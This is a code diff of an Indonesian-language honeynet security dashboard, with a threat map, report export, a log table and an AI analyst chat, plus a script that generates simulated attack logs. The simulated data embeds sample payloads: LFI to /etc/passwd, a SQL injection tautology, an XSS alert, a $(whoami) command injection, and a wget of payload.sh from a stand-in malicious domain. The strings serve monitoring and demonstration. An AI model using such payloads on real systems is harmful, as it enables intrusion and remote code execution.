+                        <h2 class="text-base font-extrabold text-slate-900 dark:text-white">Peta Ancaman Global Interaktif</h2>
+                        <p class="text-xs text-slate-400">Aliran Serangan Real-Time dari Sumber ke Sensor Honeynet</p>
+                    </div>
+                    
+                    <div class="flex items-center space-x-3">
+                        <span class="text-xs text-slate-400 font-medium">Filter Kategori:</span>
+                        <select id="mapCategoryFilter" onchange="renderMap()" class="glass-input text-xs rounded-xl px-3 py-2 focus:outline-none">
+                            <option value="all" class="bg-white dark:bg-slate-900">Semua Serangan</option>
+                            <option value="Siber" class="bg-white dark:bg-slate-900">Hanya Serangan Siber</option>
+                            <option value="Malware" class="bg-white dark:bg-slate-900">Hanya Serangan Malware</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Leaflet Map Panel -->
+                <div class="glass-panel rounded-3xl p-3 relative overflow-hidden" style="height: 540px;">
+                    <div id="honeynetMap" class="w-full h-full rounded-2xl z-10"></div>
+                    
+                    <!-- Map Floating Legend -->
+                    <div class="absolute bottom-6 left-6 z-20 glass-panel p-4 rounded-2xl text-xs space-y-2.5 shadow-2xl">
+                        <div class="font-bold text-slate-900 dark:text-white border-b border-slate-300 dark:border-slate-700/60 pb-1.5">Keterangan Node</div>
+                        <div class="flex items-center space-x-2.5">
+                            <span class="w-3 h-3 rounded-full bg-cyan-400 inline-block shadow-lg shadow-cyan-400/50"></span>
+                            <span class="text-slate-700 dark:text-slate-300 font-medium">Sensor Target Honeypot</span>
+                        </div>
+                        <div class="flex items-center space-x-2.5">
+                            <span class="w-3 h-3 rounded-full bg-rose-500 inline-block shadow-lg shadow-rose-500/50"></span>
+                            <span class="text-slate-700 dark:text-slate-300 font-medium">Sumber Serangan Siber</span>
+                        </div>
+                        <div class="flex items-center space-x-2.5">
+                            <span class="w-3 h-3 rounded-full bg-purple-500 inline-block shadow-lg shadow-purple-500/50"></span>
+                            <span class="text-slate-700 dark:text-slate-300 font-medium">Sumber Serangan Malware</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- 3. ANALISIS DAN LAPORAN TAB -->
+            <section id="tab-analisis" class="tab-content hidden space-y-6">
+                <div class="glass-panel rounded-3xl p-6 space-y-6">
+                    <div>
+                        <h2 class="text-lg font-extrabold text-slate-900 dark:text-white flex items-center">
+                            <i class="fa-solid fa-file-invoice text-purple-500 mr-2.5"></i> Generator Laporan Keamanan Honeynet
+                        </h2>
+                        <p class="text-xs text-slate-400 mt-1">Konfigurasi dan ekspor laporan intelijen siber resmi dalam format PDF atau Word (.docx).</p>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 border-t border-b border-slate-200 dark:border-slate-800/80 py-6">
+                        <!-- Component Checkboxes -->
+                        <div class="space-y-3">
+                            <label class="block text-xs font-bold uppercase tracking-wider text-purple-500">Komponen Laporan:</label>
+                            <div class="space-y-2 text-xs text-slate-700 dark:text-slate-300">
+                                <label class="flex items-center space-x-2.5 cursor-pointer">
+                                    <input type="checkbox" id="repIncSummary" checked class="rounded border-slate-400 text-purple-600 focus:ring-0">
+                                    <span>Ringkasan Eksekutif & Metrik Utama</span>
+                                </label>
+                                <label class="flex items-center space-x-2.5 cursor-pointer">
+                                    <input type="checkbox" id="repIncTimeline" checked class="rounded border-slate-400 text-purple-600 focus:ring-0">
+                                    <span>Analisis Tren Waktu Aktivitas Serangan</span>
+                                </label>
+                                <label class="flex items-center space-x-2.5 cursor-pointer">
+                                    <input type="checkbox" id="repIncTypes" checked class="rounded border-slate-400 text-purple-600 focus:ring-0">
+                                    <span>Distribusi Tipe Vektor Serangan</span>
+                                </label>
+                                <label class="flex items-center space-x-2.5 cursor-pointer">
+                                    <input type="checkbox" id="repIncCountries" checked class="rounded border-slate-400 text-purple-600 focus:ring-0">
+                                    <span>Daftar 10 Negara Asal Penyerang Teratas</span>
+                                </label>
+                                <label class="flex items-center space-x-2.5 cursor-pointer">
+                                    <input type="checkbox" id="repIncLogs" checked class="rounded border-slate-400 text-purple-600 focus:ring-0">
+                                    <span>Tabel Sampel Log Mentah Terkini</span>
+                                </label>
+                            </div>
+                        </div>
+
+                        <!-- Customization Settings -->
+                        <div class="space-y-4">
+                            <div>
+                                <label class="block text-xs font-semibold text-slate-400 mb-1">Bahasa Laporan</label>
+                                <select id="reportLang" class="glass-input w-full text-xs rounded-xl p-3 focus:outline-none">
+                                    <option value="id" class="bg-white dark:bg-slate-900">Bahasa Indonesia</option>
+                                    <option value="en" class="bg-white dark:bg-slate-900">English (Inggris)</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-xs font-semibold text-slate-400 mb-1">Judul Dokumen Laporan</label>
+                                <input type="text" id="reportTitleInput" value="LAPORAN INTELIJEN SERANGAN HONEYNET SOC" class="glass-input w-full text-xs rounded-xl p-3 focus:outline-none">
+                            </div>
+                            <div>
+                                <label class="block text-xs font-semibold text-slate-400 mb-1">Teks Header / Institusi</label>
+                                <input type="text" id="reportHeaderInput" value="Badan Siber dan Sandi Negara - Incident Response Team" class="glass-input w-full text-xs rounded-xl p-3 focus:outline-none">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Export Actions -->
+                    <div class="flex flex-wrap items-center justify-end gap-3">
+                        <button onclick="saveTemplateSettings()" class="text-xs glass-input px-4 py-3 rounded-2xl font-semibold hover:border-purple-500 transition">
+                            <i class="fa-solid fa-floppy-disk mr-1.5"></i>Simpan Template
+                        </button>
+                        <button onclick="generatePDFReport()" class="text-xs bg-rose-600 hover:bg-rose-500 text-white font-bold px-5 py-3 rounded-2xl shadow-lg shadow-rose-600/30 transition flex items-center">
+                            <i class="fa-solid fa-file-pdf text-sm mr-2"></i> Ekspor PDF
+                        </button>
+                        <button onclick="generateWordReport()" class="text-xs bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white font-bold px-5 py-3 rounded-2xl shadow-lg shadow-purple-600/30 transition flex items-center">
+                            <i class="fa-solid fa-file-word text-sm mr-2"></i> Ekspor Word (.docx)
+                        </button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- 4. LOG HONEYPOT TAB -->
+            <section id="tab-log" class="tab-content hidden space-y-4">
+                <div class="glass-panel rounded-3xl p-6 space-y-4">
+                    
+                    <!-- Filters Toolbar -->
+                    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3">
                         <div>
-                            <label class="block text-xs font-semibold text-slate-300 mb-1">Bahasa Laporan</label>
-                            <select id="reportLang" class="w-full bg-slate-800 border border-slate-700 text-xs rounded-lg p-2.5 text-slate-200">
-                                <option value="id">Bahasa Indonesia</option>
-                                <option value="en">English (Inggris)</option>
+                            <label class="block text-[11px] font-medium text-slate-400 mb-1">Tipe Serangan</label>
+                            <select id="filterAttackType" onchange="applyLogFilters()" class="glass-input w-full text-xs rounded-xl p-2.5 focus:outline-none">
+                                <option value="" class="bg-white dark:bg-slate-900">Semua Tipe</option>
+                                <option value="Port Scanning" class="bg-white dark:bg-slate-900">Port Scanning</option>
+                                <option value="SSH Intrusion" class="bg-white dark:bg-slate-900">SSH Intrusion</option>
+                                <option value="Local File Inclusion (LFI)" class="bg-white dark:bg-slate-900">LFI</option>
+                                <option value="SQL Injection" class="bg-white dark:bg-slate-900">SQL Injection</option>
+                                <option value="XSS Attack" class="bg-white dark:bg-slate-900">XSS Attack</option>
+                                <option value="Brute Force SSH" class="bg-white dark:bg-slate-900">Brute Force</option>
+                                <option value="RCE Attempt" class="bg-white dark:bg-slate-900">RCE Attempt</option>
+                                <option value="Malware Dropper" class="bg-white dark:bg-slate-900">Malware Dropper</option>
+                                <option value="Botnet C2 Callback" class="bg-white dark:bg-slate-900">Botnet C2</option>
                             </select>
                         </div>
+
                         <div>
-                            <label class="block text-xs font-semibold text-slate-300 mb-1">Judul Dokumen Laporan</label>
-                            <input type="text" id="reportTitleInput" value="LAPORAN INTELIJEN SERANGAN HONEYNET SOC" class="w-full bg-slate-800 border border-slate-700 text-xs rounded-lg p-2.5 text-slate-200 focus:outline-none focus:border-cyan-500">
+                            <label class="block text-[11px] font-medium text-slate-400 mb-1">Titik Honeypot</label>
+                            <select id="filterHoneypotNode" onchange="applyLogFilters()" class="glass-input w-full text-xs rounded-xl p-2.5 focus:outline-none">
+                                <option value="" class="bg-white dark:bg-slate-900">Semua Sensor</option>
+                                <option value="JKT-01" class="bg-white dark:bg-slate-900">JKT-01 (Jakarta)</option>
+                                <option value="SGP-01" class="bg-white dark:bg-slate-900">SGP-01 (Singapura)</option>
+                                <option value="FRA-01" class="bg-white dark:bg-slate-900">FRA-01 (Frankfurt)</option>
+                                <option value="NYC-01" class="bg-white dark:bg-slate-900">NYC-01 (New York)</option>
+                            </select>
+                        </div>
+
+                        <div>
+                            <label class="block text-[11px] font-medium text-slate-400 mb-1">IP Penyerang</label>
+                            <input type="text" id="filterIP" oninput="applyLogFilters()" placeholder="Cari IP..." class="glass-input w-full text-xs rounded-xl p-2.5 focus:outline-none">
+                        </div>
+
+                        <div>
+                            <label class="block text-[11px] font-medium text-slate-400 mb-1">Kata Kunci Payload</label>
+                            <input type="text" id="filterPayload" oninput="applyLogFilters()" placeholder="Cari payload..." class="glass-input w-full text-xs rounded-xl p-2.5 focus:outline-none">
+                        </div>
+
+                        <div>
+                            <label class="block text-[11px] font-medium text-slate-400 mb-1">Baris Per Halaman</label>
+                            <select id="rowsPerPage" onchange="applyLogFilters()" class="glass-input w-full text-xs rounded-xl p-2.5 focus:outline-none">
+                                <option value="10" class="bg-white dark:bg-slate-900">10 Baris</option>
+                                <option value="25" selected class="bg-white dark:bg-slate-900">25 Baris</option>
+                                <option value="50" class="bg-white dark:bg-slate-900">50 Baris</option>
+                                <option value="100" class="bg-white dark:bg-slate-900">100 Baris</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <!-- Log Table -->
+                    <div class="overflow-x-auto border border-slate-200 dark:border-slate-800/80 rounded-2xl">
+                        <table class="w-full text-left text-xs text-slate-700 dark:text-slate-300">
+                            <thead class="bg-purple-500/10 text-purple-600 dark:text-purple-300 uppercase text-[10px] tracking-wider font-bold">
+                                <tr>
+                                    <th class="p-3.5">Waktu (UTC)</th>
+                                    <th class="p-3.5">IP Penyerang</th>
+                                    <th class="p-3.5">Negara</th>
+                                    <th class="p-3.5">Tipe Serangan</th>
+                                    <th class="p-3.5">Titik Honeypot</th>
+                                    <th class="p-3.5">Payload / Perintah</th>
+                                </tr>
+                            </thead>
+                            <tbody id="logTableBody" class="divide-y divide-slate-200 dark:divide-slate-800/60 font-mono">
+                                <!-- Dynamic Rows -->
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <!-- Table Footer Pagination -->
+                    <div class="flex items-center justify-between text-xs text-slate-400 pt-2">
+                        <div id="logTableInfo">Menampilkan 0 dari 0 log</div>
+                        <div class="flex items-center space-x-2">
+                            <button onclick="prevPage()" id="btnPrevPage" class="px-3.5 py-1.5 glass-input rounded-xl disabled:opacity-40">Sebelumnya</button>
+                            <span id="pageNumberDisplay" class="font-bold text-slate-800 dark:text-slate-200">Halaman 1</span>
+                            <button onclick="nextPage()" id="btnNextPage" class="px-3.5 py-1.5 glass-input rounded-xl disabled:opacity-40">Selanjutnya</button>
+                        </div>
+                    </div>
+
+                </div>
+            </section>
+
+            <!-- 5. AI ANALYST TAB -->
+            <section id="tab-ai" class="tab-content hidden space-y-4">
+                <div class="glass-panel rounded-3xl p-6 flex flex-col h-[620px]">
+                    
+                    <!-- AI Header -->
+                    <div class="flex items-center space-x-3.5 pb-4 border-b border-slate-200 dark:border-slate-800">
+                        <div class="w-10 h-10 rounded-2xl bg-gradient-to-tr from-purple-600 to-indigo-600 flex items-center justify-center text-white shadow-lg shadow-purple-600/30">
+                            <i class="fa-solid fa-brain text-lg"></i>
                         </div>
                         <div>
-                            <label class="block text-xs font-semibold text-slate-300 mb-1">Teks Header / Institusi</label>
-                            <input type="text" id="reportHeaderInput" value="Badan Siber dan Sandi Negara - Incident Response Team" class="w-full bg-slate-800 border border-slate-700 text-xs rounded-lg p-2.5 text-slate-200 focus:outline-none focus:border-cyan-500">
+                            <h3 class="font-bold text-slate-900 dark:text-white text-sm">Honeynet AI Security Assistant</h3>
+                            <p class="text-xs text-slate-400">Bertanya seputar anomali log, tren ancaman, atau rekomendasi mitigasi firewall.</p>
                         </div>
                     </div>
-                </div>
 
-                <!-- Export Buttons -->
-                <div class="flex flex-wrap items-center justify-end gap-3">
-                    <button onclick="saveTemplateSettings()" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 px-4 py-2.5 rounded-xl border border-slate-700 transition">
-                        <i class="fa-solid fa-floppy-disk mr-1.5"></i>Simpan Pengaturan Template
-                    </button>
-                    <button onclick="generatePDFReport()" class="text-xs bg-rose-600 hover:bg-rose-500 text-white font-semibold px-5 py-2.5 rounded-xl shadow-lg shadow-rose-600/30 transition flex items-center">
-                        <i class="fa-solid fa-file-pdf text-base mr-2"></i> Ekspor Dokument (PDF)
-                    </button>
-                    <button onclick="generateWordReport()" class="text-xs bg-blue-600 hover:bg-blue-500 text-white font-semibold px-5 py-2.5 rounded-xl shadow-lg shadow-blue-600/30 transition flex items-center">
-                        <i class="fa-solid fa-file-word text-base mr-2"></i> Ekspor Dokumen (Word .docx)
-                    </button>
-                </div>
-            </div>
-        </section>
-
-        <!-- 4. LOG HONEYPOT TAB -->
-        <section id="tab-log" class="tab-content hidden space-y-4">
-            <div class="glass-card rounded-2xl p-5 space-y-4">
-                
-                <!-- Filter Toolbar -->
-                <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3">
-                    <div>
-                        <label class="block text-[11px] font-medium text-slate-400 mb-1">Tipe Serangan</label>
-                        <select id="filterAttackType" onchange="applyLogFilters()" class="w-full bg-slate-800 border border-slate-700 text-xs rounded-lg p-2 text-slate-200">
-                            <option value="">Semua Tipe</option>
-                            <option value="Port Scanning">Port Scanning</option>
-                            <option value="SSH Intrusion">SSH Intrusion</option>
-                            <option value="Local File Inclusion (LFI)">LFI</option>
-                            <option value="SQL Injection">SQL Injection</option>
-                            <option value="XSS Attack">XSS Attack</option>
-                            <option value="Brute Force SSH">Brute Force</option>
-                            <option value="RCE Attempt">RCE Attempt</option>
-                            <option value="Malware Dropper">Malware Dropper</option>
-                            <option value="Botnet C2 Callback">Botnet C2</option>
-                        </select>
-                    </div>
-
-                    <div>
-                        <label class="block text-[11px] font-medium text-slate-400 mb-1">Titik Honeypot</label>
-                        <select id="filterHoneypotNode" onchange="applyLogFilters()" class="w-full bg-slate-800 border border-slate-700 text-xs rounded-lg p-2 text-slate-200">
-                            <option value="">Semua Sensor</option>
-                            <option value="JKT-01">JKT-01 (Jakarta)</option>
-                            <option value="SGP-01">SGP-01 (Singapura)</option>
-                            <option value="FRA-01">FRA-01 (Frankfurt)</option>
-                            <option value="NYC-01">NYC-01 (New York)</option>
-                        </select>
-                    </div>
-
-                    <div>
-                        <label class="block text-[11px] font-medium text-slate-400 mb-1">IP Penyerang</label>
-                        <input type="text" id="filterIP" oninput="applyLogFilters()" placeholder="Cari IP..." class="w-full bg-slate-800 border border-slate-700 text-xs rounded-lg p-2 text-slate-200 placeholder-slate-500">
-                    </div>
-
-                    <div>
-                        <label class="block text-[11px] font-medium text-slate-400 mb-1">Kata Kunci Payload</label>
-                        <input type="text" id="filterPayload" oninput="applyLogFilters()" placeholder="Cari payload..." class="w-full bg-slate-800 border border-slate-700 text-xs rounded-lg p-2 text-slate-200 placeholder-slate-500">
-                    </div>
-
-                    <div>
-                        <label class="block text-[11px] font-medium text-slate-400 mb-1">Baris Per Halaman</label>
-                        <select id="rowsPerPage" onchange="applyLogFilters()" class="w-full bg-slate-800 border border-slate-700 text-xs rounded-lg p-2 text-slate-200">
-                            <option value="10">10 Baris</option>
-                            <option value="25" selected>25 Baris</option>
-                            <option value="50">50 Baris</option>
-                            <option value="100">100 Baris</option>
-                        </select>
-                    </div>
-                </div>
-
-                <!-- Log Data Table -->
-                <div class="overflow-x-auto border border-slate-800 rounded-xl">
-                    <table class="w-full text-left text-xs text-slate-300">
-                        <thead class="bg-slate-800/90 text-slate-400 uppercase text-[10px] tracking-wider border-b border-slate-700">
-                            <tr>
-                                <th class="p-3">Waktu (UTC)</th>
-                                <th class="p-3">IP Penyerang</th>
-                                <th class="p-3">Negara</th>
-                                <th class="p-3">Tipe Serangan</th>
-                                <th class="p-3">Titik Honeypot</th>
-                                <th class="p-3">Payload / Perintah</th>
-                            </tr>
-                        </thead>
-                        <tbody id="logTableBody" class="divide-y divide-slate-800/60 font-mono">
-                            <!-- Populated dynamically by JS -->
-                        </tbody>
-                    </table>
-                </div>
-
-                <!-- Pagination Footer -->
-                <div class="flex items-center justify-between text-xs text-slate-400 pt-2">
-                    <div id="logTableInfo">Menampilkan 0 dari 0 log</div>
-                    <div class="flex items-center space-x-2">
-                        <button onclick="prevPage()" id="btnPrevPage" class="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 rounded-lg text-slate-300 disabled:opacity-50">Sebelumnya</button>
-                        <span id="pageNumberDisplay" class="font-semibold text-slate-200">Halaman 1</span>
-                        <button onclick="nextPage()" id="btnNextPage" class="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 rounded-lg text-slate-300 disabled:opacity-50">Selanjutnya</button>
-                    </div>
-                </div>
-
-            </div>
-        </section>
-
-        <!-- 5. AI ANALYST TAB -->
-        <section id="tab-ai" class="tab-content hidden space-y-4">
-            <div class="glass-card rounded-2xl p-5 flex flex-col h-[600px]">
-                
-                <!-- AI Header -->
-                <div class="flex items-center space-x-3 pb-4 border-b border-slate-800">
-                    <div class="p-2.5 bg-gradient-to-tr from-purple-500 to-indigo-600 rounded-xl text-white shadow-lg shadow-purple-500/30">
-                        <i class="fa-solid fa-robot text-xl"></i>
-                    </div>
-                    <div>
-                        <h3 class="font-bold text-slate-200 text-sm">Honeynet AI Security Assistant</h3>
-                        <p class="text-xs text-slate-400">Bertanya seputar tren log, pola ancaman, atau rekomendasi mitigasi jaringan.</p>
-                    </div>
-                </div>
-
-                <!-- Chat Log Messages -->
-                <div id="chatMessages" class="flex-1 overflow-y-auto py-4 space-y-4 text-xs">
-                    <!-- Default System Welcome -->
-                    <div class="flex items-start space-x-3">
-                        <div class="w-7 h-7 rounded-lg bg-purple-600/30 border border-purple-500/50 flex items-center justify-center text-purple-400 text-xs">
-                            <i class="fa-solid fa-robot"></i>
-                        </div>
-                        <div class="bg-slate-800/80 rounded-2xl p-3.5 max-w-xl text-slate-200 border border-slate-700/60 leading-relaxed">
-                            Halo Analyst! Saya adalah asisten intelijen Honeynet Anda. Saya telah menganalisis log serangan terkini. Apa yang ingin Anda ketahui?
+                    <!-- Chat Messages -->
+                    <div id="chatMessages" class="flex-1 overflow-y-auto py-4 space-y-4 text-xs">
+                        <div class="flex items-start space-x-3">
+                            <div class="w-8 h-8 rounded-xl bg-purple-600/20 border border-purple-500/30 flex items-center justify-center text-purple-400 font-bold">
+                                AI
+                            </div>
+                            <div class="glass-panel rounded-2xl p-4 max-w-xl text-slate-800 dark:text-slate-200 leading-relaxed">
+                                Halo Analyst! Saya telah menganalisis seluruh log honeypot terkini. Apa yang ingin Anda ketahui seputar vektor serangan atau anomali jaringan?
+                            </div>
                         </div>
                     </div>
+
+                    <!-- Quick Prompts -->
+                    <div class="flex items-center space-x-2 overflow-x-auto py-2">
+                        <button onclick="sendQuickPrompt('Ringkaskan tren serangan utama dalam log ini.')" class="text-[11px] whitespace-nowrap glass-input px-3 py-1.5 rounded-full text-purple-500 font-semibold hover:border-purple-500">
+                            📊 Ringkasan Tren Utama
+                        </button>
+                        <button onclick="sendQuickPrompt('Negara mana yang paling agresif dan tipe serangannya?')" class="text-[11px] whitespace-nowrap glass-input px-3 py-1.5 rounded-full text-rose-500 font-semibold hover:border-rose-500">
+                            🌍 Analisis Negara Penyerang
+                        </button>
+                        <button onclick="sendQuickPrompt('Berikan rekomendasi mitigasi firewall berdasarkan data ini.')" class="text-[11px] whitespace-nowrap glass-input px-3 py-1.5 rounded-full text-emerald-500 font-semibold hover:border-emerald-500">
+                            🛡️ Rekomendasi Mitigasi
+                        </button>
+                    </div>
+
+                    <!-- Chat Form Input -->
+                    <form onsubmit="handleChatSubmit(event)" class="flex items-center space-x-2 pt-2">
+                        <input type="text" id="chatInput" placeholder="Tanyakan seputar data honeypot..." class="glass-input flex-1 text-xs rounded-2xl px-4 py-3 focus:outline-none">
+                        <button type="submit" class="bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white font-bold px-6 py-3 rounded-2xl shadow-lg shadow-purple-600/30 transition text-xs">
+                            <i class="fa-solid fa-paper-plane mr-1.5"></i> Kirim
+                        </button>
+                    </form>
                 </div>
+            </section>
 
-                <!-- Quick Prompts Suggestions -->
-                <div class="flex items-center space-x-2 overflow-x-auto py-2">
-                    <button onclick="sendQuickPrompt('Ringkaskan tren serangan utama dalam log ini.')" class="text-[11px] whitespace-nowrap bg-slate-800 hover:bg-slate-700 text-cyan-400 px-3 py-1 rounded-full border border-slate-700">
-                        📊 Ringkasan Tren Utama
-                    </button>
-                    <button onclick="sendQuickPrompt('Negara mana yang paling agresif dan tipe serangannya?')" class="text-[11px] whitespace-nowrap bg-slate-800 hover:bg-slate-700 text-rose-400 px-3 py-1 rounded-full border border-slate-700">
-                        🌍 Analisis Negara Penyerang
-                    </button>
-                    <button onclick="sendQuickPrompt('Berikan rekomendasi mitigasi firewall berdasarkan data ini.')" class="text-[11px] whitespace-nowrap bg-slate-800 hover:bg-slate-700 text-emerald-400 px-3 py-1 rounded-full border border-slate-700">
-                        🛡️ Rekomendasi Mitigasi
-                    </button>
-                </div>
+        </main>
+    </div>
 
-                <!-- Input Field -->
-                <form onsubmit="handleChatSubmit(event)" class="flex items-center space-x-2 pt-2">
-                    <input type="text" id="chatInput" placeholder="Tanyakan seputar data honeypot (contoh: Berapa total serangan SQL Injection?)..." class="flex-1 bg-slate-800 border border-slate-700 text-xs rounded-xl px-4 py-3 text-slate-200 focus:outline-none focus:border-purple-500">
-                    <button type="submit" class="bg-purple-600 hover:bg-purple-500 text-white font-medium px-5 py-3 rounded-xl shadow-lg shadow-purple-600/30 transition text-xs">
-                        <i class="fa-solid fa-paper-plane mr-1"></i> Kirim
-                    </button>
-                </form>
-            </div>
-        </section>
-
-    </main>
-
-    <!-- MOBILE BOTTOM NAVIGATION -->
-    <nav class="md:hidden fixed bottom-0 left-0 right-0 glass-card border-t border-slate-800 z-50 flex justify-around py-2 bg-slate-900/90">
-        <button onclick="switchTab('dashboard')" class="mobile-tab flex flex-col items-center text-cyan-400" id="mob-dashboard">
+    <!-- MOBILE BOTTOM NAV BAR -->
+    <nav class="md:hidden fixed bottom-0 left-0 right-0 glass-panel border-t border-slate-300 dark:border-slate-800 z-50 flex justify-around py-2.5">
+        <button onclick="switchTab('dashboard')" class="mobile-tab flex flex-col items-center text-purple-500" id="mob-dashboard">
             <i class="fa-solid fa-chart-pie text-base"></i>
-            <span class="text-[10px] mt-1">Dashboard</span>
+            <span class="text-[9px] font-bold mt-1">Dashboard</span>
         </button>
         <button onclick="switchTab('threatmap')" class="mobile-tab flex flex-col items-center text-slate-400" id="mob-threatmap">
             <i class="fa-solid fa-earth-americas text-base"></i>
-            <span class="text-[10px] mt-1">Map</span>
+            <span class="text-[9px] font-bold mt-1">Map</span>
         </button>
         <button onclick="switchTab('analisis')" class="mobile-tab flex flex-col items-center text-slate-400" id="mob-analisis">
             <i class="fa-solid fa-file-contract text-base"></i>
-            <span class="text-[10px] mt-1">Laporan</span>
+            <span class="text-[9px] font-bold mt-1">Laporan</span>
         </button>
         <button onclick="switchTab('log')" class="mobile-tab flex flex-col items-center text-slate-400" id="mob-log">
             <i class="fa-solid fa-list-check text-base"></i>
-            <span class="text-[10px] mt-1">Log</span>
+            <span class="text-[9px] font-bold mt-1">Log</span>
         </button>
         <button onclick="switchTab('ai')" class="mobile-tab flex flex-col items-center text-slate-400" id="mob-ai">
             <i class="fa-solid fa-brain text-base"></i>
-            <span class="text-[10px] mt-1">AI</span>
+            <span class="text-[9px] font-bold mt-1">AI</span>
         </button>
     </nav>
 
     <!-- JAVASCRIPT LOGIC -->
     <script>
         /* ==========================================================================
-           1. DATA GENERATION & INITIAL STATE (Minimal 5.000 log, 30 Hari)
+           1. DATA GENERATION & INITIAL STATE
            ========================================================================== */
         let ALL_LOGS = [];
         let FILTERED_LOGS = [];
         let liveStreamInterval = null;
         let isStreamPaused = false;
         let leafletMap = null;
+        let mapTileLayer = null;
         let mapHeatLayer = null;
         let mapMarkersGroup = null;
 
         let chartTimelineInstance = null;
         let chartTypesInstance = null;
+        let sparklineCyberInstance = null;
+        let sparklineMalwareInstance = null;
 
         let logCurrentPage = 1;
 
-        // Honeypot target nodes
         const HONEYPOT_NODES = [
             { id: 'JKT-01', name: 'Jakarta Node', lat: -6.2088, lng: 106.8456 },
             { id: 'SGP-01', name: 'Singapore Node', lat: 1.3521, lng: 103.8198 },
@@ -551,17 +642,16 @@
             { id: 'NYC-01', name: 'New York Node', lat: 40.7128, lng: -74.0060 }
         ];
 
-        // Attacking countries seed database
         const COUNTRIES = [
-            { code: 'CN', name: 'Tiongkok', lat: 35.8617, lng: 104.1954, weight: 25 },
-            { code: 'RU', name: 'Rusia', lat: 61.5240, lng: 105.3188, weight: 20 },
-            { code: 'US', name: 'Amerika Serikat', lat: 37.0902, lng: -95.7129, weight: 15 },
-            { code: 'BR', name: 'Brasil', lat: -14.2350, lng: -51.9253, weight: 10 },
-            { code: 'IN', name: 'India', lat: 20.5937, lng: 78.9629, weight: 10 },
-            { code: 'NL', name: 'Belanda', lat: 52.1326, lng: 5.2913, weight: 5 },
-            { code: 'ID', name: 'Indonesia', lat: -0.7893, lng: 113.9213, weight: 5 },
-            { code: 'DE', name: 'Jerman', lat: 51.1657, lng: 10.4515, weight: 5 },
-            { code: 'VN', name: 'Vietnam', lat: 14.0583, lng: 108.2772, weight: 5 }
+            { code: 'CN', name: 'Tiongkok', lat: 35.8617, lng: 104.1954 },
+            { code: 'RU', name: 'Rusia', lat: 61.5240, lng: 105.3188 },
+            { code: 'US', name: 'Amerika Serikat', lat: 37.0902, lng: -95.7129 },
+            { code: 'BR', name: 'Brasil', lat: -14.2350, lng: -51.9253 },
+            { code: 'IN', name: 'India', lat: 20.5937, lng: 78.9629 },
+            { code: 'NL', name: 'Belanda', lat: 52.1326, lng: 5.2913 },
+            { code: 'ID', name: 'Indonesia', lat: -0.7893, lng: 113.9213 },
+            { code: 'DE', name: 'Jerman', lat: 51.1657, lng: 10.4515 },
+            { code: 'VN', name: 'Vietnam', lat: 14.0583, lng: 108.2772 }
         ];
 
         const ATTACK_TYPES = [
@@ -569,37 +659,27 @@
             { name: 'SSH Intrusion', category: 'Siber', port: 22, payload: 'SSH-2.0-OpenSSH_8.2p1 auth attempt' },
             { name: 'Local File Inclusion (LFI)', category: 'Siber', port: 80, payload: 'GET /index.php?page=../../../../etc/passwd' },
             { name: 'SQL Injection', category: 'Siber', port: 80, payload: "POST /login ' OR '1'='1' --" },
-            { name: 'XSS Attack', category: 'Siber', port: 80, payload: "GET /search?q=<script>alert(document.cookie)<\\/script>" },
+            { name: 'XSS Attack', category: 'Siber', port: 80, payload: "GET /search?q=<script>alert(1)<\/script>" },
             { name: 'Brute Force SSH', category: 'Siber', port: 22, payload: 'User: root, Pass: admin12345 (50 attempts/sec)' },
             { name: 'RCE Attempt', category: 'Siber', port: 8080, payload: 'POST /api/v1/exec payload=$(whoami)' },
             { name: 'Malware Dropper', category: 'Malware', port: 443, payload: 'Wget http://malicious-domain.com/payload.sh' },
             { name: 'Botnet C2 Callback', category: 'Malware', port: 6667, payload: 'IRC PING/PONG Botnet Heartbeat Beacon' }
         ];
 
-        /* Generate Random IP */
         function getRandomIP(countryCode) {
             const prefix = countryCode === 'CN' ? '114.247.' : countryCode === 'RU' ? '185.220.' : countryCode === 'US' ? '104.28.' : '182.16.';
             return prefix + Math.floor(Math.random() * 254 + 1) + '.' + Math.floor(Math.random() * 254 + 1);
         }
 
-        /* Load Data Function (Easily replaceable with real API JSON) */
         function loadData() {
-            // CATATAN INTEGRASI API: Ganti fungsi ini dengan fetch() ke backend API honeypot asli Anda.
             const logs = [];
             const now = new Date();
             const thirtyDaysAgo = new Date(now.getTime() - (30 * 24 * 60 * 60 * 1000));
 
             for (let i = 0; i < 5200; i++) {
-                // Random timestamp within 30 days
                 const timestamp = new Date(thirtyDaysAgo.getTime() + Math.random() * (now.getTime() - thirtyDaysAgo.getTime()));
-                
-                // Pick weighted country
                 const country = COUNTRIES[Math.floor(Math.random() * COUNTRIES.length)];
-                
-                // Pick attack type
                 const attack = ATTACK_TYPES[Math.floor(Math.random() * ATTACK_TYPES.length)];
-                
-                // Pick honeypot node
                 const node = HONEYPOT_NODES[Math.floor(Math.random() * HONEYPOT_NODES.length)];
 
                 logs.push({
@@ -608,7 +688,7 @@
                     ip_penyerang: getRandomIP(country.code),
                     negara_kode: country.code,
                     negara: country.name,
-                    lat: country.lat + (Math.random() - 0.5) * 2, // Jitter lat/lng
+                    lat: country.lat + (Math.random() - 0.5) * 2,
                     lng: country.lng + (Math.random() - 0.5) * 2,
                     tipe_serangan: attack.name,
                     kategori: attack.category,
@@ -620,20 +700,21 @@
                 });
             }
 
-            // Sort descending by timestamp
             logs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
             return logs;
         }
 
         /* ==========================================================================
-           2. INITIALIZATION & TAB NAVIGATION
+           2. INITIALIZATION & DYNAMIC THEME SWITCHING
            ========================================================================== */
         window.addEventListener('DOMContentLoaded', () => {
-            // Load saved theme
